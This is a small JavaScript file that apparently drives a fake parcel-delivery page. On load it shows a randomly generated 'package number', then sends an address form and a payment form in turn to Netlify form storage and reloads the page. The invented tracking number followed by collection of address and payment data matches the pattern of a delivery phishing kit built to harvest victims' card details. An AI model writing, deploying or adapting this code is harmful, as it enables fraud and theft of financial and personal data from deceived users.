// Function to generate a random 9-digit package number
function generateRandomPackageNumber() {
  const randomNumber = Math.floor(100000000 + Math.random() * 900000000);
  document.getElementById('packageNumber').textContent = randomNumber;
}

// Function to show the specified page
function showPage(pageNumber) {
  document.querySelectorAll('.container').forEach(page => page.classList.add('hidden'));
  document.getElementById(`page${pageNumber}`).classList.remove('hidden');
}

// Function to handle Page 2 form submission
function handleAddressSubmit(event) {
  event.preventDefault(); // Prevent default submission

  const form = event.target;
  const formData = new FormData(form);

  // Submit Page 2 form data to Netlify
  fetch('/', {
    method: 'POST',
    body: formData,
  })
    .then(() => {
      showPage(3); // Navigate to Page 3 after successful submission
    })
    .catch(error => {
      console.error('Error submitting Page 2 form:', error);
      alert('There was an error submitting your information. Please try again.');
    });
}

// Function to handle Page 3 form submission
function handlePaymentSubmit(event) {
  event.preventDefault(); // Prevent default submission

  const form = event.target;
  const formData = new FormData(form);

  // Submit Page 3 form data to Netlify
  fetch('/', {
    method: 'POST',
    body: formData,
  })
    .then(() => {
      alert('Thank you! Your information has been submitted.');
      location.reload(); // Refresh the page to Page 1
    })
    .catch(error => {
      console.error('Error submitting Page 3 form:', error);
      alert('There was an error submitting your payment. Please try again.');
    });
}

// Generate a random package number on page load
generateRandomPackageNumber();
